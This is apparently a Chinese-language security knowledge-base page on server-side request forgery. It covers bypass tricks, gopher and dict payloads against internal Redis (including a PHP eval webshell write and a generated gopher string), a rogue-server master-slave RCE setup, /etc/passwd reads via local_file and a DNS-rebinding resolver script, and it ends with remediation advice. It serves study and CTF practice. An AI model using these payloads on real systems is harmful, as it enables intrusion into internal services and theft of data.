# SSRF

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**描述**

很多 web 应用都提供了从其他的服务器上获取数据的功能.使用用户指定的 URL,web 应用可以获取图片,下载文件,读取文件内容等.这个功能如果被恶意使用,可以利用存在缺陷的 web 应用作为代理攻击远程和本地的服务器.这种形式的攻击称为服务端请求伪造攻击(Server-side Request Forgery).

一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。

**相关文章**
- [浅析 SSRF 原理及利用方式](https://www.anquanke.com/post/id/145519)
- [Bypassing SSRF Protection](https://medium.com/@vickieli/bypassing-ssrf-protection-e111ae70727b)
- [Web漏洞挖掘指南 -SSRF服务器端请求伪造](https://mp.weixin.qq.com/s/JptsaTEB-OCWoic68uKTvw)
- [巧用对象存储回源绕过SSRF限制](https://mp.weixin.qq.com/s/BB34N50q2aWrVgu5LDcj6g)
- [SSRF漏洞Bypass技巧](https://zhuanlan.zhihu.com/p/73736127)
- [SSRF安全指北](https://cloud.tencent.com/developer/article/1780081)
- [浅谈云上攻防--SSRF漏洞带来的新威胁](https://cloud.tencent.com/developer/article/1885981)
- [实战篇丨聊一聊SSRF漏洞的挖掘思路与技巧](https://mp.weixin.qq.com/s/v6ZcP55hFwd3QB4TNnpfRg)
- [我在CTFHub学习SSRF](https://www.freebuf.com/articles/web/258365.html)
- [SSRF 攻击内网服务](http://diego.team/2020/05/27/ssrf-%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1/)
- [SSRF检测的一些思考](https://xz.aliyun.com/t/11050)
- [SSRF Tricks小结](https://www.mi1k7ea.com/2020/02/29/SSRF-Tricks%E5%B0%8F%E7%BB%93/)

**相关案例**
- [My First SSRF Using DNS Rebinding](https://geleta.eu/2019/my-first-ssrf-using-dns-rebinfing/)
- [SSRF in Exchange leads to ROOT access in all instances](https://hackerone.com/reports/341876) - 通过对 ssrf 访问 Google Cloud Metadata,直至 RCE
- [SSRF (Server Side Request Forgery) worth $4,913](https://medium.com/techfenix/ssrf-server-side-request-forgery-worth-4913-my-highest-bounty-ever-7d733bb368cb)
- [Just Gopher It: Escalating a Blind SSRF to RCE for $15k](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)
- [SSRF exploitation in Spreedsheet to PDF converter](https://r4id3n.medium.com/ssrf-exploitation-in-spreedsheet-to-pdf-converter-2c7eacdac781) - excel 中的 ssrf+xxe 读文件
- [The unexpected Google wide domain check bypass](https://bugs.xdavidhu.me/google/2020/03/08/the-unexpected-google-wide-domain-check-bypass/)
- [Fixing the Unfixable: Story of a Google Cloud SSRF](https://bugs.xdavidhu.me/google/2021/12/31/fixing-the-unfixable-story-of-a-google-cloud-ssrf/) - google cloud ssrf + bypass
- https://github.com/httpvoid/writeups/blob/main/Hacking-Google-Drive-Integrations.md
- [BountyHunterInChina/重生之我是赏金猎人(六)-强行多次FUZZ发现某厂商SSRF到redis密码喷洒批量反弹Shell.pdf](https://github.com/J0o1ey/BountyHunterInChina/blob/main/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA(%E5%85%AD)-%E5%BC%BA%E8%A1%8C%E5%A4%9A%E6%AC%A1FUZZ%E5%8F%91%E7%8E%B0%E6%9F%90%E5%8E%82%E5%95%86SSRF%E5%88%B0redis%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E6%89%B9%E9%87%8F%E5%8F%8D%E5%BC%B9Shell.pdf)
- [Security issues with cloudflare/odoh-server-go and the ODoH RFC draft #30](https://github.com/cloudflare/odoh-server-go/issues/30)
- [Vimeo upload function SSRF](https://dphoeniixx.medium.com/vimeo-upload-function-ssrf-7466d8630437)
- [[Google VRP] SSRF in Google Cloud Platform StackDriver](https://ngailong.wordpress.com/2019/12/19/google-vrp-ssrf-in-google-cloud-platform-stackdriver/)
- [Critical SSRF on Evernote](https://blog.neolex.dev/13/)
- [How to hack a company by circumventing its WAF through the abuse of a different security appliance and win bug bounties](https://www.redtimmy.com/how-to-hack-a-company-by-circumventing-its-waf-through-the-abuse-of-a-different-security-appliance-and-win-bug-bounties/)
- [挖到这个高危SSRF漏洞，小伙伴们都惊呆了！](https://www.freebuf.com/vuls/265163.html)

**payload**
- [bugbounty-cheatsheet/cheatsheets/ssrf.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/ssrf.md)

**相关工具**
- [In3tinct/See-SURF](https://github.com/In3tinct/See-SURF) - python 写的 ssrf 参数扫描工具
- [swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap) - 自动化 Fuzz SSRF 开发工具
- [ksharinarayanan/SSRFire](https://github.com/ksharinarayanan/SSRFire) - An automated SSRF finder. Just give the domain name and your server and chill! ;) Also has options to find XSS and open redirects
- [vp777/surferFTP](https://github.com/vp777/surferFTP) - SSRF to TCP Port Scanning, Banner and Private IP Disclosure by abusing the FTP protocol/clients
- [ethicalhackingplayground/ssrf-king](https://github.com/ethicalhackingplayground/ssrf-king) - SSRF plugin for burp Automates SSRF Detection in all of the Request

**相关靶场**
- [incredibleindishell/SSRF_Vulnerable_Lab](https://github.com/incredibleindishell/SSRF_Vulnerable_Lab) - This Lab contain the sample codes which are vulnerable to Server-Side Request Forgery attack

**相关资源**
- [cujanovic/SSRF-Testing](https://github.com/cujanovic/SSRF-Testing) - SSRF (Server Side Request Forgery) testing resources
- [assetnote/blind-ssrf-chains](https://github.com/assetnote/blind-ssrf-chains) - An exhaustive list of all the possible ways you can chain your Blind SSRF vulnerability
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#

**writeup**
- [buuctf 刷题记录 [第二章 web进阶]SSRF Training](https://www.cnblogs.com/murkuo/p/14905886.html)
- [看雪CTF web（SSRF+XML+JAR协议）](https://blog.csdn.net/a3320315/article/details/110456361)

---

## ssrf 有哪些危害

- 内部端口扫描

- 攻击内网服务 (例如: redis,memcache,或存在 log4j rce 的服务)
    - 攻击 Kubelet API : 在云环境中，可通过 Kubelet API 查询集群 pod 和 node 的信息，也可通过其执行命令。为了安全考虑，此服务一般不对外开放。但是，攻击者可以通过 SSRF 去访问 Kubelet API，获取信息和执行命令。
    - 攻击 Docker Remote API：Docker Remote API 是一个取代远程命令行界面（rcli）的 REST API，默认开放端口为 2375。此 API 如果存在未授权访问，则攻击者可以利用其执行 docker 命令，获取敏感信息，并获取服务器 root 权限。因此为了安全考虑，一般不会在外网开放，此时我们就可以通过 SSRF 去尝试攻击那些不对外开放的 Docker Remote API。其过程与攻击 Kubelet API 类似。
    - 越权攻击云平台内其他组件或服务：由于云上各组件相互信任，当云平台内某个组件或服务存在 SSRF 漏洞时，就可通过此漏洞越权攻击其他组件或者服务。例如用户正常请求服务 A 时，云 API 层会对请求进行校验，其中包括身份、权限等。如果服务 A 存在 SSRF 漏洞，则可构造请求使服务 A 访问服务 B，因为服务 A 与服务 B 互相信任，所以服务 B 未校验服务 A 的请求，从而越权操作服务 B 的资源。

- 绕过 cdn 获取真实ip
    - https://webhook.site/

- 利用 ssrf 进行访问,产生 dos 的效果

- Cloud Metadata
    - 在云环境中，元数据即表示实例的相关数据，可以用来配置或管理正在运行中的实例。攻击通过 SSRF 去访问元数据中存储的临时密钥或者用于自启动实例的启动脚本，这些脚本可能会包含 AK、密码、源码等等，然后根据从元数据服务获取的信息，攻击者可尝试获取到受害者账户下 COS、CVM、集群等服务的权限。
    - [metadata 泄露](../../云安全/公有云安全.md#metadata-泄露)

---

## java 中的 ssrf

- [java ssrf](../../语言安全/JAVA安全/JAVA代码审计.md#ssrf)

---

## php 中的 ssrf

- [php ssrf](../../语言安全/PHP安全/PHP代码审计.md#ssrf)

---

## python 中的 ssrf

在 Python 中，常用的函数有 urllib(urllib2) 和 requests 库。

**CVE-2019-9740 & CVE-2019-9947**

以 urllib(urllib2) 为例， urllib 并不支持 gopher,dict 协议，但 urllib 曾爆出 CVE-2019-9740、CVE-2019-9947 两个漏洞，这两个漏洞都是 urllib(urllib2) 的 CRLF 漏洞，触发点不同，其影响范围都在 urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3 之间.

**漏洞示例**
```py
import sys
import urllib2
host = "127.0.0.1:7777?a=1 HTTP/1.1\r\nCRLF-injection:
test\r\nTEST: 123"
url = "http://"+ host + ":8080/test/?test=a"
try:
  info = urllib2.urlopen(url).info()
  print(info)
except Exception as e:
  print(e)
```

通过 CLRF漏洞，实现换行对redis的攻击

**CVE-2019-9948**

该漏洞只影响 urllib，范围在 Python 2.x 到 2.7.16，这个版本间的 urllib 支持 local_file/local-file 协议，可以读取任意文件

```
/ssrf?url=local_file:/etc/passwd
/ssrf?url=local-file:/etc/passwd
```

**解析差异**

已目标为例 http://baidu.com\@qq.com
- urllib3 取到的 host 是 baidu.com
- urllib 取到的 host 是 qq.com

---

## 绕过技巧

### 使用 @ 符号

当我们需要通过 URL 发送用户名和密码时，可以使用 http://username:password@www.xxx.com，此时 @前的字符会被当作用户名密码处理，@后面的字符才是我们请求的地址，即 `http://test.com@127.0.0.1/` 与 `http://127.0.0.1/` 请求时是相同的，而这种方法有时可以绕过系统对地址的检测。

### 不同的 IP 格式

**不同进制**

开发人员在提取或者过滤域名或者 IP 时，未考虑到 IP 的进制转换的影响，则存在被利用进制转换绕过的可能。浏览器不仅可以识别正常的 IP 地址，也可以识别八进制、十进制、十六进制等其他进制的 IP 地址，但是有时候开发人员会忽视这一点，因此有时，我们可以通过这一点去绕过防护。

> http://www.subnetmask.info/

```bash
# 8进制 (127.0.0.1)
0177.0.0.1

# 10进制 (127.0.0.1)
2130706433

# 16进制 (127.0.0.1)
0x7F.0x00.0x00.0x01

# 注意：16进制使用时一定要加0x，不然浏览器无法识别，八进制使用的时候要加0
```

**利用别名绕过**

```
http://localhost/

http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

**不规范格式**

```
http://0.0.0.0
http://127.000.000.1
http://127.1
http://127。0。0。1
http://①②⑦。0。0。①
```

**IPv6**

```
http://[::1]
http://[::]
http://[::]:80/
http://0000::1:80/
```

### Enclosed alphanumerics

封闭式字母数字（Enclosed Alphanumerics）字符是一个Unicode块，其中包含圆形，支架或其他非封闭外壳内的字母数字印刷符号，或以句号结尾。封闭的字母数字块包含一个表情符号，封闭的M用作掩码工作的符号。它默认为文本显示，并且定义了两个标准化变体，用于指定表情符号样式或文本表示。这些字符也是可以被浏览器识别的，而开发人员有时会忽略这一点。

```
①②⑦。0。0。① --> 127.0.0.1
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ --> example.com
```

```
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

### 不同的协议头

```
gopher://
dict://
php://
jar://
tftp://
zip://
```

#### jar

jar:// 协议能从远程获取 jar 文件及解压得到其中的内容，其格式如下：
```
jar:<url>!/{entry}
```
实例如下，`!` 符号后面就是其需要从中解压出的文件：
```
jar:http://a.com/b.jar!/file/within/the/zip
```

jar:// 协议分类：
```
Jar file（Jar包本身）：jar:http://www.foo.com/bar/baz.jar!/
Jar entry（Jar包中某个资源文件）：jar:http://www.foo.com/bar/baz.jar!/COM/foo/a.class
Jar directory（Jar包中某个目录）：jar:http://www.foo.com/bar/baz.jar!/COM/foo/
```

也使用 jar 协议进行 Blind SSRF

**利用**

```
jar:scheme://domain/path!/
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/
```

![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SSRF/6.png)

![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SSRF/7.png)

---

#### dict

**描述**

dict 协议有一个功能：dict://serverip:port/name:data 向服务器的端口请求 name data，并在末尾自动补上 rn(CRLF)。也就是如果我们发出 dict://serverip:port/config:set:dir:/var/spool/cron/ 的请求，redis 就执行了 config set dir /var/spool/cron/ . 用这种方式可以一步步执行 redis getshell 的 exp，执行完就能达到和 gopher 一样的效果。原理一样，但是 gopher 只需要一个 url 请求即可，dict 需要步步构造。

**对内网 redis 的利用**

```
dict://127.0.0.1:6379/info
dict://127.0.0.1:6379/keys *
```

---

#### Gopher

gopher 协议支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，在构成符合 gopher 协议的请求。

gopher 协议是 ssrf 利用中最强大的协议

**相关文章**
- [Gopher协议在SSRF漏洞中的深入研究](https://zhuanlan.zhihu.com/p/112055947)
- [gopher 协议初探](https://www.cnblogs.com/Konmu/p/12984891.html)

**相关工具**
- [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus) - 该工具生成 gopher payload ，以利用 SSRF 并在各种服务器中获得 RCE
- [xmsec/redis-ssrf](https://github.com/xmsec/redis-ssrf) - redis ssrf gopher generater && redis ssrf to rce by master-slave-sync

**格式**
```
gopher://<host>:<port>/<gopher-path>_后接TCP数据流

curl gopher://127.0.0.1:8000/_GET%20test
```

gopher 的默认端口是70

如果发起 post 请求，回车换行需要使用 %0d%0a，如果多个参数，参数之间的 & 也需要进行 URL 编码

**发送 get 请求**

如果要发送如下 payload
```
GET /test/get.php?name=test HTTP/1.1
Host: 192.168.1.2
```

那么需要变为如下格式
```
curl gopher://192.168.1.2:80/_GET%20/test/get.php%3fname=test%20HTTP/1.1%0d%0AHost:%20192.168.1.2%0d%0A
```

在 HTTP 包的最后要加 %0d%0a，代表消息结束

**发送 post 请求**

```
POST /test/post.php HTTP/1.1
Host: 192.168.1.1
Content-Type:application/x-www-form-urlencoded
Content-Length:11

name=test
```

那么需要变为如下格式
```
curl gopher://192.168.1.1:80/_POST%20/test/post.php%20HTTP/1.1%0d%0AHost:192.168.1.1%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=test%0d%0A
```

**ssrf 中的利用**

```
http://192.168.1.1/test/ssrf.php?url=gopher://192.168.1.2:6666/_abc

# 由于PHP在接收到参数后会做一次URL的解码,所以要在 url 编码一次
http://192.168.1.1/test/ssrf.php?url=gopher%3A%2F%2F192.168.1.2%3A80%2F_GET%2520%2Ftest%2Fget.php%253fname%3Dtest%2520HTTP%2F1.1%250d%250AHost%3A%2520192.168.1.2%250d%250A
```

URL中的／不能进行两次编码，端口号不可以两次编码,协议名称不可两次转码

##### 配合 Redis 未授权访问漏洞进行攻击

我们可以利用 Gopher 协议远程操纵目标主机上的 Redis，可以利用 Redis 自身的提供的 config 命令像目标主机写 WebShell、写 SSH 公钥、创建计划任务反弹 Shell 等，其思路都是一样的，就是先将 Redis 的本地数据库存放目录设置为 web 目录、~/.ssh 目录或 /var/spool/cron 目录等，然后将 dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行 save 或 bgsave 保存，则我们就指定的目录里写入指定的文件了。

**绝对路径写 WebShell**

redis命令
```
flushall
set 1 '<?php eval($_POST["whoami"]);?>'
config set dir /var/www/html
config set dbfilename shell.php
save
```

利用 Gopherus

```
gopherus --exploit redis
```
```
gopher%3A%2F%2F10.211.55.3%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%25248%250D%250A%250A%250Atest%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%25244%250D%250A%2Ftmp%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
```

这里将生成的 payload 要进行 url 二次编码（因为我们发送 payload 用的是 GET 方法），然后利用服务器上的 SSRF 漏洞，将二次编码后的 payload 打过去就行了：

![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SSRF/4.png)

![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SSRF/3.png)

**Redis 主从复制**

以 [网鼎杯 2020 玄武组]SSRFMe 这一题为例, buuoj 上有环境,方便复现

题目信息:
- 通过 http://0.0.0.0/ 访问本机绕过对内网IP的检测
- Redis 配置了密码,为 root
- 利用主从复制进行 rce

利用脚本 https://github.com/xmsec/redis-ssrf

修改脚本
```py
    elif mode==3:
        lhost="192.168.1.100"   # 改成 vps 的地址
        lport="6666"            # 改成 vps 的监听端口
        command="whoami"        # 改成 cat /flag

    ......

    protocol="gopher://"

    ip="127.0.0.1"              # 改成 0.0.0.0 绕过题目中的限制
    port="6379"

    ......

    passwd = ''                 # 密码改成 root
```

生成 payload,记得 URL 编码一下

rogue-server 使用这个项目的 https://github.com/Dliv3/redis-rogue-server.git

```
python3 redis-rogue-server.py --server-only --lport 6666
```

访问

![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SSRF/5.png)

#### FTP

**相关文章**
- [如何用 FTP 被动模式打穿内网](https://www.anquanke.com/post/id/254387)
- [URL ECCENTRICITIES IN JAVA](https://blog.pwnl0rd.me/post/lfi-netdoc-file-java/)
    - [samsbp/java-file-ftp](https://github.com/samsbp/java-file-ftp)

**利用**

```
ftp://127.0.0.1:21/file
```

### DNS 与 重定向欺骗

#### wildcard DNS

开发人员在构建 SSRF 防护时，只考虑到了域名，没有考虑到域名解析后的 IP，则存在被利用域名解析服务来绕过的可能。

```
10.0.0.1.xip.io
www.10.0.0.1.xip.io
mysite.10.0.0.1.xip.io
foo.bar.10.0.0.1.xip.io
```

> http://xip.io

```
10.0.0.1.nip.io
app.10.0.0.1.nip.io
customer1.app.10.0.0.1.nip.io
customer2.app.10.0.0.1.nip.io
otherapp.10.0.0.1.nip.io
```

> http://nip.io

#### 302 跳转

当防御方限制只允许 http(s) 访问或者对请求的 host 做了正确的校验后，可以通过 30x 方式跳转进行绕过。

比如,我们可以搭建一个服务,在收到目标服务器的请求后添加一个 Location 响应头重定向至内网服务器
```php
<?php header("location: http://127.0.0.1"); ?>
```

#### url 短链

开发人员在进行 SSRF 防护时，未考虑到短网址的影响，则存在被利用短网址绕过的可能。
- https://a.f8x.io/

#### DNS-Rebinding

> DNS重绑定

**描述**

DNS 重绑定攻击的原理是当我们设置恶意域名 TTL 为非常小的值时，DNS 记录仅在短时间内有效,目标服务第一次解析域名后，第二次重新请求 DNS 服务器获取新的 ip，两次 DNS 解析是有时间差的，我们可以使用这个时间差进行绕过，利用服务器两次解析同一域名的短暂间隙，更换域名背后的 ip 进行 ssrf。

利用方法如下：
1. 在网站 SSRF 漏洞处访问精心构造的域名。网站第一次解析域名，获取到的 IP 地址为 A；
2. 经过网站后端服务器的检查，判定此 IP 为合法 IP。
3. 网站获取 URL 对应的资源（在一次网络请求中，先根据域名服务器获取 IP 地址，再向 IP 地址请求资源），第二次解析域名。此时已经过了 ttl 的时间，解析记录缓存 IP 被删除。第二次解析到的域名为被修改后的 IP 即为内网 IP B；
4. 攻击者访问到了内网 IP。

**注意点**

1. java 中 DNS 请求成功的话默认缓存 30s(字段为 networkaddress.cache.ttl，默认情况下没有设置)，失败的默认缓存 10s。（缓存时间在 /Library/Java/JavaVirtualMachines/jdk /Contents/Home/jre/lib/security/java.security 中配置）所以一般认为 java 不存在 DNS rebinding 问题。
2. 在 php 中则默认没有缓存。
3. Linux 默认不会进行 DNS 缓存，mac 和 windows 会缓存 (所以复现的时候不要在 mac、windows 上尝试)
4. 有些公共 DNS 服务器，比如 114.114.114.114 还是会把记录进行缓存，但是 8.8.8.8 是严格按照 DNS 协议去管理缓存的，如果设置 TTL 为 0，则不会进行缓存。

**相关文章/案例**
- [DNS Rebinding 域名重新绑定攻击技术](https://cloud.tencent.com/developer/article/1400018)
- [通过 DNS Rebinding 获取访客 QQ 号](https://0x0d.im/archives/get-visitor-qq-number-through-dns-rebinding.html)
- [Java环境下通过时间竞争实现DNS Rebinding 绕过SSRF 防御限制](https://mp.weixin.qq.com/s/dA40CUinwaitZDx6X89TKw)
- [渗透测试-DNS重绑定](https://mp.weixin.qq.com/s/Y03173LF2SN5zF1zgvx4EQ)
- [从0到1认识DNS重绑定攻击](https://xz.aliyun.com/t/7495)
- [DNS Rebinding in Browser](https://mp.weixin.qq.com/s/jiX1zC5_1y9tipYzM8Oxdg)

**相关工具**
- [makuga01/dnsFookup](https://github.com/makuga01/dnsFookup) - DNS rebinding toolkit
- [nccgroup/singularity](https://github.com/nccgroup/singularity) - A DNS rebinding attack framework.
- http://ceye.io/dns-rebinding
- [Tr3jer/dnsAutoRebinding](https://github.com/Tr3jer/dnsAutoRebinding) - ssrf、ssrfIntranetFuzz、dnsRebinding、recordEncode、dnsPoisoning、Support ipv4/ipv6

**利用方法**

Dns rebinding 常见方案除了自建 dns 服务器之外，还可以通过绑定两个 A 记录，一个绑定外网 ip，一个绑定内网 ip。这种情况访问顺序是随机的，无法保证成功率。

自建 dns 服务器需要配置将域名的 dns 服务指向自己的 vps，然后在 vps 上运行域名解析脚本，内容如下
```py
#!/usr/bin/env python
# -*- encoding: utf-8 -*-
from twisted.internet import reactor, defer
from twisted.names import client, dns, error, server

record={}
class DynamicResolver(object):
    def _doDynamicResponse(self, query):
        name = query.name.name
        if name not in record or record[name]<2:
            # 随意一个 IP，绕过检查即可
            ip="1.2.3.4"
        else:
            ip="127.0.0.1"
            record[name]=0
        if name not in record:
            record[name]=0
        record[name]+=1
        print name+" ===> "+ip
        answer = dns.RRHeader(
            name=name,
            type=dns.A,
            cls=dns.IN,
            ttl=0,
            payload=dns.Record_A(address=b'%s'%ip,ttl=0)
        )
        answers = [answer]
        authority = []
        additional = []
        return answers, authority, additional
    def query(self, query, timeout=None):
        return defer.succeed(self._doDynamicResponse(query))

def main():
    factory = server.DNSServerFactory(
        clients=[DynamicResolver(), client.Resolver(resolv='/etc/resolv.conf')]
    )
    protocol = dns.DNSDatagramProtocol(controller=factory)
    reactor.listenUDP(53, protocol)
    reactor.run()

if __name__ == '__main__':
    raise SystemExit(main())
```

```bash
python2 -m pip install twisted

systemctl stop systemd-resolved

python2 test.py
```

![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SSRF/2.png)

![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SSRF/1.png)

当第一次访问时，解析为外网 ip 通过 ssrf 检测，

第二次访问时，也即业务访问时，ip 会指向 127.0.0.1，从而达到了绕过目的。

#### TLS Poison

- [TLS Poison](../../协议安全/Protocol-Exploits.md#tls-poison)

---

## SSRF 修复方案

* 过滤 url 中的特殊字符
* 禁用不需要的协议，只允许 HTTP 和 HTTPS 请求，可以防止类似于 file://, gopher://, ftp:// 等引起的问题。
* 白名单的方式限制访问的目标地址，禁止对内网发起请求。
* 过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。
* 验证请求的文件格式,禁止跟随 301、302 跳转。
* 限制请求的端口为 http 常用的端口，比如 80、443、8080、8000 等。
* 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
